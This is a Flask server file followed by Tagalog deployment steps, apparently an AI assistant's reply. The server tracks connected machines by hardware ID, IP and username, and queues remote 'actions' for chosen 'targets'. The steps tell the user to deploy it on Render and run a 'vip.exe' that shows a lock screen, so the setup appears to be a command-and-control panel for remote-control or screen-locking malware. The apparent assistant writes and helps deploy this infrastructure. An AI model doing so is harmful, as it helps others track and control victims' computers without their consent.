import time
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

clients = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    hwid = data.get('hwid')
    ip = data.get('ip')
    username = data.get('username', 'Client_Alpha') # Kukuha ng username o magiging default kung wala
    if hwid:
        clients[hwid] = {
            "hwid": hwid,
            "ip": ip,
            "username": username, # Isinasama na ngayon sa clients dictionary
            "last_seen": time.time(),
            "pending_action": clients.get(hwid, {}).get("pending_action", "")
        }
    return "", 200

@app.route('/api/clients')
def get_clients():
    now = time.time()
    offline_nodes = [hwid for hwid, info in clients.items() if now - info["last_seen"] > 35]
    for hwid in offline_nodes:
        del clients[hwid]
    return jsonify(clients)

@app.route('/api/target-action', methods=['POST'])
def target_action():
    data = request.json
    hwid = data.get('hwid')
    action = data.get('action', '')
    if hwid in clients:
        clients[hwid]["pending_action"] = action
    return "", 200

@app.route('/api/clear-target', methods=['POST'])
def clear_target():
    data = request.json
    hwid = data.get('hwid')
    if hwid in clients:
        del clients[hwid]
    return "", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```[cite: 3]

### Ano ang susunod mong gagawin?
1. Palitan ang laman ng iyong `app.py` file sa proyekto gamit ang code sa itaas.
2. Siguraduhing na-update mo na rin ang `index.html` at `vip.py` batay sa mga ibinigay ko kanina.
3. I-push o i-deploy ulit sa Render ang iyong mga binagong file (`app.py` at `index.html`).
4. Subukan mo ulit patakbuhin ang `vip.exe`, maglagay ng sarili mong username sa lock screen, i-unlock ito, at makikita mo nang nag-a-update ito sa iyong web panel!
